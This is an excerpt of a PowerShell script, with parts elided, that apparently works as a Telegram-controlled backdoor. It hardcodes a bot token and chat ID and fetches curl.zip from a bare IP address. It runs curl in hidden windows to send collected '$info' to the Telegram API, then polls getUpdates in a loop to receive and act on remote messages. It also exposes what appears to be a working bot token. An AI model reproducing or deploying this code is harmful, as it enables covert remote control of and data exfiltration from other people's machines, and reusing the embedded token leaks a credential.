...
$BotToken = "632012537:AAGwMH74A0DSDRovvbFhiZloGpsSGaz_x00"
$ChatID = '184832283'
...
function installCurl {
    ...
    if(![System.IO.File]::Exists($curl)){
        ...
        if ( (Test-Path $curl_mod) -eq $false ) {
            ...
            $webclient = "system.net.webclient" ; $webclient = New-Object $webclient ; $webrequest = $webclient.DownloadFile("http://81.46.230.151/pargal/curl.zip", "C:\SOFT_FIRMA\curl.zip")
...
#$payload = ConvertTo-Json -Compress -InputObject $payload
$curl = installCurl
$uri = "https://api.telegram.org/bot" + $BotToken + "/sendMessage"
$argumenlist = $uri + " -X POST -k -d chat_id=" + $ChatID + " -d text="" + $info + """
Start-Process $curl -ArgumentList $argumenlist -WindowStyle Hidden

echo "Testing Invoke-WebRequest"
...
Invoke-WebRequest `
    ...
    -Body (ConvertTo-Json -Compress -InputObject $payload2)


echo "Testing Invoke-RestMethod"

$test = Invoke-RestMethod -Uri www.google.es


echo "Testing Invoke-WebRequest basicparsing"
...
Invoke-WebRequest `
    ...
    -Method Post `
    -ContentType "application/json;charset=utf-8" `
    -Body (ConvertTo-Json -Compress -InputObject $payload3)
...
Start-Process $curl -ArgumentList "-k -X GET https://api.telegram.org/bot$($BotToken)/getUpdates" -NoNewWindow -Wait -RedirectStandardOutput a.txt
$BotUpdates =  Get-Content .\a.txt
  
$BotUpdatesResults = $BotUpdates | ConvertTo-JSON
echo $BotUpdatesResults

#echo $BotUpdatesResults.Split("\\")[-29]

$LastMessageTime_Origin = $BotUpdatesResults.Split("\\")[-29].Replace('"', '').Replace(':', '').Replace(',','')
 
echo $LastMessageTime_Origin
...
While ($DoNotExit)  {
  ...
  $LastMessage = $BotUpdatesResults.Split("\\")[-23].Replace('"','')
  echo $LastMessage
  #Get the last message time
  #$LastMessageTime = $LastMessage.message.date
  $LastMessageTime = $BotUpdatesResults.Split("\\")[-29].Replace('"', '').Replace(':', '').Replace(',','')
  ...
  If ($LastMessageTime -gt $PreviousLoop_LastMessageTime)  {
	...
	Switch -Wildcard ($LastMessageText)  {
	  ...
	  default  {
		...
		#$SendMessage = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($Message)&parse_mode=html"
        $uri = "https://api.telegram.org/bot" + $BotToken + "/sendMessage"
        $argumenlist = $uri + " -X POST -k -d chat_id=" + $ChatID + " -d text="" + $Message + """
        Start-Process $curl -ArgumentList $argumenlist -WindowStyle Hidden
	  }
	}
